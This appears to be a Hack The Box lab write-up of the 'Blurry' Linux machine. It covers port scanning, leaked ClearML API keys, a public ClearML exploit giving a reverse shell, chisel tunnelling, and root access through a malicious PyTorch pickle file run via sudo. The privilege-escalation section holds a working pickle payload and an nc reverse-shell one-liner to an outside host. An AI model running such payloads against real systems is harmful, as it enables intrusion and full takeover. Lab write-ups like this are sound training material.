+++
title = 'Blurry'
date = 2024-11-09
draft = false
tags = ["Linux"]
category = ["htb"]
summary = "HTB - Linux - Medium"
+++

# Enum

## Port Scanning
```bash
┌──(fish㉿kali)-[~/htb/blurry]
└─$ nmap -p22,80 -A -oN service-scan.nmap $IP
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://app.blurry.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


## 80/nginx 1.18
```bash
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://app.blurry.htb/
|_http-server-header: nginx/1.18.0
```

"Did not follow redirect to http://app.blurry.htb/" - Going to need to add the `app.blurry.htb` and `blurry.htb` to our `/etc/hosts` file.

![](/Screenshots/Blurry_image_1.png)
`Allegro AI’s` 

Looking at the web application, find a potential user`jippity@blurry`

![](/Screenshots/Blurry_image_2.png)


Found a function to create new credentials which gives us two other subdomains.

![](/Screenshots/Blurry_image_3.png)

```bash
api { 
    web_server: http://app.blurry.htb
    api_server: http://api.blurry.htb
    files_server: http://files.blurry.htb
    credentials {
        "access_key" = "8LFREGYE0KOLQYJNWGY3"
        "secret_key"  = "rFDwCFblgrh4l4tuA1eYrwu8A0bxoD4YHepLDIm6kPce8ISnaV"
    }
}
```

![](/Screenshots/Blurry_image_4.png)
![](/Screenshots/Blurry_image_5.png)

![](/Screenshots/Blurry_image_6.png)




---
# Foothold

With the creds we found in the application we can set up clear-ml python sdk on our local box. 

We can then use an exploit hosted on github to get a reverse shell >> https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit . This is a client-side attack so it'll need some kind of interaction from a user.

Steps:
1. Clone the repo locally
	1. `git clone https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit.git`
2. Move into the exploit dir and run it
	1. `python3 exploit.py`
3. Type 1 and hit enter to initialize. We'll need to paste creds in from the web app. You can easily get a pastable configuration by creating a new experiment.
4. If we're successful, we can go back to the main menu and input the remaining config items and set up our reverse shell.


![](/Screenshots/Blurry_image_7.png)

![](/Screenshots/Blurry_image_8.png)
![](/Screenshots/Blurry_image_9.png)

And we have a shell

## Exploits
https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit

--- 
# PrivEsc

Our foothold exploit needed user interaction in order to execute, looking in the user's home directory we find the script responsible for that interaction - `review_tasks.py`.

Linpeas finds a few different ports listening on localhost
![](/Screenshots/Blurry_image_10.png)
```bash
3000
8008
8080
```


Our user also has the ability to run a sudo command without a password

![](/Screenshots/Blurry_image_11.png)

```bash
User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
```


Going to grab the user `jippity`'s `id_rsa` key to be able to easily SSH back to the box and have a more stable shell.

Since we know ports are listening on the localhost of our victim box, lets set up a socks proxy with chisel so we can view them in our browser
```bash
┌──(fish㉿kali)-[~/htb/blurry/www]
└─$ ./chisel_arm server --reverse --port 1081
...
jippity@blurry:/dev/shm$ ./chisel client 10.10.14.7:1081 R:socks
```

We can then switch over foxyproxy to use our tunnel proxy and browse the the sites.
![](/Screenshots/Blurry_image_12.png)

### 3000
![](/Screenshots/Blurry_image_13.png)

We can create a new account and login. looking at the chats, they mention a devops platform.
![](/Screenshots/Blurry_image_14.png)
![](/Screenshots/Blurry_image_15.png)

Moving on as I wasn't able to find anything relevant with rocketchat.

Considering our sudo privs allow us to execute a command, lets take a deeper look into what it actually does.

![](/Screenshots/Blurry_image_16.png)
The command appears to run a ml model stored in `/models/*.pth`.
![](/Screenshots/Blurry_image_17.png)
We do have a copy of the python script and we have the ability to read it.

![](/Screenshots/Blurry_image_18.png)
The script is using pytorch to run a ML model and there's an interesting vulnerability with pytorch and pickle files which we can use to execute arbitrary code. Reference https://github.com/pytorch/pytorch/issues/31875

![](/Screenshots/Blurry_image_19.png)

Looking further into what `pickle` in python actually means
![](/Screenshots/Blurry_image_20.png)
So it's converting a python object to or from binary or binary like object (serialization). There's a nice big red text box stating it's insecure as it can be used to execute arbitrary code during "unpickling" (deserialization).
Looking at the github issue, it seems we can re-write the `reduce` python class with system commands.

```python
ON_REDUCE = """
global MAGIC_NUMBER
MAGIC_NUMBER = None
import os;os.system('cat /etc/passwd')
"""
class Payload:
    def __reduce__(self):
        return (exec, (ON_REDUCE,))
```

Crafted the below script to verify it works. We can run our sudo command against any `.pth` file in `/models`. The script below will create a new `.pth` file named `evil.pth`, using torch.save we can save the Payload class as the evil.pth file. 

```python
import torch
import os

class Payload:
def __reduce__(self):
return (os.system, ("id",))

exploit = Payload()
torch.save(exploit, 'evil.pth')
```

And it does, we can see the output of the `id` command.
![](/Screenshots/Blurry_image_21.png)

Modifying the exploit with a reverse shell as the system command gets us a callback as the root user.
```python
import torch
import os

class Payload:
def __reduce__(self):
return (os.system, ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.7 9003 >/tmp/f",))

exploit = Payload()
torch.save(exploit, 'evil.pth')
```

![](/Screenshots/Blurry_image_22.png)

And we're root. We can grab the root.txt file and complete the box.



## Exploits
https://github.com/pytorch/pytorch/issues/31875

---
